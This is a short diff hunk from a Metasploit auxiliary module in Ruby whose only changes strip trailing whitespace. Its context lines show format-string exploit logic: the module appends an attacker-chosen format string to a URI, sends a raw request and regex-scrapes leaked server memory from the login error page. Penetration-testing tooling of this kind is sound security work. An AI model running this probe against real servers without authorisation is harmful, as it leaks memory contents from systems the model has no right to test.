@@ -51,13 +51,13 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("FORMAT string length cannot exceed 125 bytes.")
 			return
 		end
-			
+
 		fmt = datastore['FORMAT'] + "XX"  # XX is 2 bytes used to mark end of memory garbage for regexp
 		begin
 			res = send_request_raw({
 				'uri' => datastore['URI'] + fmt,
 			})
-			
+
 			if res.code == 200
 				res.body.scan(/\<td class\=\"loginError\"\>(.+)XX/ism)
 				print_status("Information leaked: #{$1}")
